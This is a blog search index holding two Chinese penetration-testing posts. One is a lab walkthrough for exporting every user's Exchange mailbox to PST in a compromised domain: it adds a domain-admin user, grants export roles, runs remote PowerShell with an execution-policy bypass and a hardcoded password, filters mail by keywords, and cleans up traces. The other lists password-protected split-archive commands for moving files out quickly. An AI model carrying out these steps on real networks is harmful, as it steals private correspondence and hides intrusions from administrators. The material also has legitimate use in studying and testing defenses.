<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[[域渗透]Exchange邮件导出]]></title>
    <url>%2F2019%2F08%2F13%2F%E5%9F%9F%E6%B8%97%E9%80%8F-Exchange%E9%82%AE%E4%BB%B6%E5%AF%BC%E5%87%BA%2F</url>
    <content type="text"><![CDATA[使用 Exchange Management Shell (EMS) 导出邮件 一、测试环境机器名IP备注AD01192.168.20.10win server 2008 r2，域控Exchange01192.168.20.11win server 2008 r2，Exchange 2010，安装所有角色john-pc192.168.20.12window 7，域内个人机打开 PST 邮件，使用 free kernel pst viewer 二、基于 EMS 操作步骤 需要在 Exchange01 服务器 UI 界面操作 and 打开 AD01 域控服务器 在邮件服务器上打开 Exchange Management Shell 打开 EMS 所需权限：Organization Management 组成员1234# 提升 &apos;scarlet&apos; 用户为域管权限 and 加入 Organization Management 组net user scarlet 123456 /addnet group &quot;domain admins&quot; scarlet /addnet group &quot;Organization Management&quot; scarlet /add 新建一个 Exchange 角色组并将其添加到 Mailbox Import Export 管理角色中 123# 创建一个角色组名称为 "Enterprise Mail Support"，并将其赋予 "Mailbox Import Export" 角色权限，将 'scarlet' 用户加入到组成员# 创建完成需要重启 EMSNew-RoleGroup -Name "Enterprise Mail Support" -Roles "Mailbox Import Export" -Members scarlet -Description "Import Export_Enterprise Support" 创建共享文件夹 1net share test$=c:\temp\PST /GRANT:Everyone,FULL 获取所有用户邮件地址 12# 导出到 csvGet-Mailbox -ResultSize Unlimited |select displayname,PrimarySmtpAddress |Export-Csv -Encoding utf8 all-email.csv -NoTypeInformation 导出指定用户邮件 1234# 导出邮件需要凭证为 "Mailbox Import Export" 角色组成员# hostname 如果是本机，需要填本机计算机名，如 exchange01，不能 127.0.0.1# 也可以导出到其它机器的共享文件夹，注意文件夹权限，否则导出失败New-MailboxExportRequest -Mailbox scarlet -FilePath "\\hostname\test$\scarlet.pst" 使用 CSV 文件导出所有用户邮件 123456# 把需要导出的用户名写到 all-email.csv$mail = import-csv -path "C:\temp\all-email.csv"foreach ($user in $mail)&#123; $Alias = $user.displaynameNew-MailboxExportRequest -Mailbox $Alias -FilePath "\\exchange01\test$\$Alias.pst"&#125; 清理痕迹 12345678# 删除角色Remove-RoleGroup -Identity "Enterprise Mail Support"# 删除已完成请求Get-MailboxExportRequest -Status Completed | Remove-MailboxExportRequest# 从组中删除用户 net group "Organization Management" scarlet /delete# 删除用户（可跳过这步保留用户）net user scarlet /delete 三、基于远程 PowerShell 操作步骤 需要在 john-pc 个人机的 PowerShell 操作 and 打开 AD01 域控服务器需要管理员权限开启 PowerShell (1) 有 UI 界面 设置 powershell 执行权限 1Set-ExecutionPolicy RemoteSigned 设置密码 1$pass = ConvertTo-SecureString "!QAZ2wsx" -AsPlainText -Force 设置凭证 1$Credential = New-Object System.Management.Automation.PSCredential ("scarlet@test.com", $pass) 设置会话 12# 注意：-ConnectionUri 的值是 http、不是 https$Session = New-PSSession -ConfigurationName Microsoft.Exchange -ConnectionUri http://exchange01.test.com/PowerShell/ -Authentication Kerberos -Credential $Credential 导入会话 1Import-PSSession $Session -DisableNameChecking 遍历用户邮箱 1Get-Mailbox -ResultSize Unlimited |select displayname,PrimarySmtpAddress 创建导入导出角色 1New-RoleGroup –Name "Enterprise Mail Support" -Roles "Mailbox Import Export" -Members scarlet -Description "Import Export_Enterprise Support" 导出邮件 12# 导出邮件需要凭证为 "Mailbox Import Export" 角色组成员New-MailboxExportRequest -Mailbox john -FilePath "\\exchange01\test$\john.pst" 清理痕迹 1234# 删除角色Remove-RoleGroup -Identity "Enterprise Mail Support"# 删除已完成请求Get-MailboxExportRequest –Status Completed | Remove-MailboxExportRequest 移除会话 1Remove-PSSession $Session (2) 纯命令行操作 12# 绕过 Powershell 执行权限，执行 abc.ps1PowerShell -exec bypass -command ". 'C:\programdata\abc.ps1'" &gt; log.txt abc.ps1 内容如下，注释部分按需解除 12345678910111213141516171819202122232425262728$pass = ConvertTo-SecureString "!QAZ2wsx" -AsPlainText -Force # 用户名即使没创建邮箱，也应写邮箱地址全称，如：scarlet@test.com$Credential = New-Object System.Management.Automation.PSCredential ("scarlet@test.com", $pass) $Session = New-PSSession -ConfigurationName Microsoft.Exchange -ConnectionUri http://exchange01.test.com/PowerShell/ -Authentication Kerberos -Credential $Credential Import-PSSession $Session -DisableNameChecking # 获取所有用户邮件地址# Get-Mailbox -ResultSize Unlimited |select displayname,PrimarySmtpAddress # 添加导入导出角色# New-RoleGroup –Name "Enterprise Mail Support" -Roles "Mailbox Import Export" -Members scarlet -Description "Import Export_Enterprise Support" # 按收发时间导出邮件，用户名在 all-email.csv 文件 'displayname' 列&lt;# $mail = import-csv -path "c:\programdata\all-email.csv" foreach ($user in $mail)&#123; $Alias = $user.displayname New-MailboxExportRequest -ContentFilter &#123;((Sent -gt '07/15/2019 0:00:00') -and (Sent -lt '07/31/2019 23:59:59')) -or ((Received -gt '07/15/2019 0:00:00') -and (Received -lt '07/31/2019 23:59:59'))&#125; -Mailbox $Alias -FilePath "\\exchange01\test$\$Alias.pst" &#125;#&gt; # 清除已完成请求# Get-MailboxExportRequest -Status Completed | Remove-MailboxExportRequestRemove-PSSession $Session 四、其它常用命令记录 导出用户 Tony 在 2010 年 1 月 1 日之前收到的邮件正文中包含“公司”和“利润”的邮件。有关如何使用 ContentFilter 参数的详细信息。 1New-MailboxExportRequest -Mailbox Tony -ContentFilter &#123;(body -like "*company*") -and (body -like "*profit*") -and (Received -lt "01/01/2010")&#125; -FilePath "\\SERVER01\PSTFileShare\Tony_CompanyProfits.pst" 将 Kweku 的收件箱中的所有邮件导出到 .pst 文件 1New-MailboxExportRequest -Mailbox Kweku -IncludeFolders "#Inbox#" -FilePath \\SERVER01\PSTFileShare\Kweku\LegalHold.pst 五、参考文章使用远程 PowerShell 连接到 Exchange 服务器Exchange 邮件导出方法Exchange 用户归档邮件导入导出 PST 操作实例Exchange 2010 SP1 及以上邮箱的数据导出与导入域渗透之Exchange Server-ContentFilter 参数的可筛选属性)]]></content>
      <categories>
        <category>域渗透</category>
      </categories>
      <tags>
        <tag>EMS</tag>
        <tag>Powershell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[快速打包系统文件]]></title>
    <url>%2F2019%2F05%2F09%2F%E5%BF%AB%E9%80%9F%E6%89%93%E5%8C%85%E7%B3%BB%E7%BB%9F%E6%96%87%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[在传输速度有限制的情况下，快速压缩大文件能大大提升效率，为下一步的分析工作赢得时间 一、Windows1. 7z支持格式：7z，ZIP，XZ，BZIP2，GZIP，TAR 12345 a 文件名-t 压缩类型，如 -tzip，默认 7z-r 递归压缩-p 指定密码，如 -p123456-v 分卷压缩，单位 b|k|m|g 普通压缩1234# 单个文件7z.exe a filename.7z -p123456 filename.txt# 递归压缩文件夹7z.exe a filename.7z -p123456 -r dir_path 分卷压缩17z.exe a filename.7z -p123456 -v100m filename.txt 2. WinRAR提取 winRAR 安装目录中的 rar.exe 即可使用注意： 在 32 位系统运行完毕会报错，不懂为何 12345678 a 文件名 -a 添加要压缩的文件-p 指定压缩密码-r 递归压缩,默认只压根目录,需要先注册下,把rarreg.key丢到安装winrar目录即可-v 分卷压缩，单位 b|k|m|g-m3 标准(默认)-m4 较好(较高的压缩比) -m5 最优(最高压缩比,速度最慢) 123456# 单个文件rar.exe a filename.rar -p123456 -m4 -a filename.txt# 文件夹rar.exe a filename.rar -p123456 -m5 -r -a dir_path# 分卷压缩rar.exe a filename.rar -p123456 -m4 -v100m -a filename.txt]]></content>
      <tags>
        <tag>小工具</tag>
      </tags>
  </entry>
</search>
